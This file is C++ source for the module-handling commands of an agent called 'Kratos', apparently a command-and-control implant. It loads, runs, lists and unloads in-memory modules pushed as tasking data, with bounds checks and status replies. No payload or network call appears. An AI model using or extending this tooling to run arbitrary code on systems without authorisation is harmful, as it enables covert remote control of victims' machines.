#include "agent/core.h"
#include "modules/modules.h"
#include "packager/packager.h"


// [TaskID] [ModuleBit] -> per command args
void Kratos::runModuleCmd() {
	INT32 TaskID = packager->UnPack4();
	INT32 ModuleBit = packager->UnPack4( );
	packager->Pack4(TaskID);

	if ( ! modules->RunModuleCommand( ModuleBit ) ) {
		return;
	}
}

void Kratos::moduleLoad() {
	DEBUG_LOG("[+] Loading Module");
	INT32 TaskID = packager->UnPack4( );
	INT32 ModuleBit = packager->UnPack4( );
	packager->Pack4(TaskID);

	INT32 ModuleSize = packager->UnPack4( );
	if ( ModuleSize <= 0 || packager->ReadIndex < 0 ||
		 ( SIZE_T )packager->ReadIndex + ( SIZE_T )ModuleSize > packager->ReadBufSize ) {
		packager->Pack4(OUTPUT_ERROR);
		packager->Pack4(ERROR_MODULE_LOAD_FAILURE);
		return;
	}

	PBYTE ModuleBytes = packager->UnPackBytes( ModuleSize );
	if ( ! ModuleBytes ) {
		packager->Pack4(OUTPUT_ERROR);
		packager->Pack4(ERROR_MODULE_LOAD_FAILURE);
		return;
	}

	if ( ModuleBit < 0 || ModuleBit >= MAX_MODULES ) {
		kratos->apis.LocalFree( ModuleBytes );
		packager->Pack4(OUTPUT_ERROR);
		packager->Pack4(ERROR_MODULE_LOAD_FAILURE);
		return;
	}

	if ( modules->IsModuleLoaded(ModuleBit) ) {
		DEBUG_LOG("[!] Module Loaded!");

		kratos->apis.LocalFree( ModuleBytes );
		packager->Pack4(OUTPUT_ERROR);
		packager->Pack4(ERROR_MODULE_LOADED);
		return;
	}

	if ( ! modules->LoadModule( ModuleBytes, ModuleSize, ModuleBit ) ) {
		DEBUG_LOG("[+] Failed Loading Modules");

		kratos->apis.LocalFree( ModuleBytes );
		packager->Pack4(OUTPUT_ERROR);
		packager->Pack4(ERROR_MODULE_LOAD_FAILURE);
		return;
	}
	DEBUG_LOG("[+]  Module Loaded");

	kratos->apis.LocalFree( ModuleBytes );
	packager->Pack4(OUTPUT_SUCCESS);
	packager->Pack4(SUCCESS_MODULE_LOAD);
	return;
}


void Kratos::moduleList() {
	auto TaskID    = packager->UnPack4( );
	auto ModuleBit = packager->UnPack4( );
	packager->Pack4(TaskID);

	auto bits = modules->GetLoadedModulesBitMap();
	packager->Pack4(OUTPUT_NO_PARSE);
	packager->Pack8(bits);
}


void Kratos::moduleUnload( ) {
	INT32 TaskID    = packager->UnPack4( );
	INT32 ModuleBit = packager->UnPack4( );
	packager->Pack4(TaskID);

	if ( ModuleBit < 0 || ModuleBit >= MAX_MODULES || ! modules->IsModuleLoaded(ModuleBit) ) {
		DEBUG_LOG("[!] Module Not Loaded!");
		packager->Pack4( OUTPUT_ERROR );
		packager->Pack4( ERROR_MODULE_NOT_LOADED );
		return;
	}

	if ( ! modules->UnLoadModule( ModuleBit ) ) {
		packager->Pack4( OUTPUT_ERROR );
		packager->Pack4( ERROR_MODULE_UNLOAD_FAILURE );
		return;
	}

	packager->Pack4( OUTPUT_SUCCESS );
	packager->Pack4( SUCCESS_MODULE_UNLOAD );
	return;
} 